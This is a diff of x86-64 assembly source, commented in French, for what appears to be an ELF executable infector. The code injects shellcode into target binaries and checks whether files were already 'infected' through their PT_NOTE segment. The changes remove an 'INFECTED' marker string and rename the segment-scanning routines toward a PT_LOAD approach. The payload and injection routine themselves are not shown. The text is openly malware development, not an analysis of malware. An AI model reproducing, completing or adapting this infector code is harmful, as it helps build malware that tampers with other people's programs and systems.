@@ -11,8 +11,6 @@ section .data
     mod_len equ $ - mod_msg
     already_mod_msg db "Ce fichier a déjà été modifié", 10
     already_mod_len equ $ - already_mod_msg
-    signature db "INFECTED", 0     ; Signature pour marquer les fichiers infectés    
-    sig_len equ $ - signature
 
     ; Section contenant le shellcode qui sera injecté dans le fichier cible
     section .data.shellcode
@@ -124,15 +122,15 @@ _start:
     add rsp, 144            ; Libère l'espace stat_buf
 
     call verify_elf
-    call find_pt_note
+    call find_pt_load
 
-check_if_modified:
+check_if_segment_modified:
     ; Vérifie s'il reste des segments à analyser
     mov rcx, r12            ; Utilise rcx comme compteur
     test rcx, rcx           ; Vérifie si le compteur est à zéro
     jz exit                 ; Si zéro, sortir
 
-.check_loop:
+.segments_check_loop:
     ; Lecture du segment
     push rcx                        ; Sauvegarde le compteur de boucle
     mov rax, 8                      ; Prépare l'appel système lseek
@@ -149,27 +147,18 @@ check_if_modified:
     
     ; Vérifie si le type de segment est PT_NOTE
     cmp dword [phdr], 4             ; Compare le type de segment avec PT_NOTE
-    je .found_modified              ; Si égal, segment PT_NOTE trouvé
+    je .found_modified_segment              ; Si égal, segment PT_NOTE trouvé
     
     ; Passe au segment suivant
     pop rcx                         ; Restaure le compteur de boucle
     add [current_offset], rdx       ; Incrémente l'offset actuel par la taille de l'entrée
-    loop .check_loop                ; Décrémente rcx et boucle si rcx n'est pas zéro
+    loop .segments_check_loop                ; Décrémente rcx et boucle si rcx n'est pas zéro
     
-.found_modified:
+.found_modified_segment:
     pop rcx                 ; Restaure la pile
     jmp file_already_modified ; Sauter à la routine de fichier déjà modifié
 
-scan_headers:
-    push rsi                    ; Sauvegarde le registre rsi
-    xchg rax, rsi               ; Échange les valeurs de rax et rsi
-    lea rsi, [elf_msg]          ; Charge l'adresse du message dans rsi
-    mov dl, elf_len             ; Charge la longueur du message dans dl
-    mov al, 1                   ; Prépare l'appel système write (syscall numéro 1)
-    syscall
-    jmp exit                    ; Sauter à la routine de sortie
-
-find_pt_note:
+find_pt_load:
     push rdx                    ; Sauvegarde le registre rdx
     xor edx, edx                ; Mettre edx à zéro
     mov dx, [phdr_number]       ; Charger le nombre de program headers dans dx
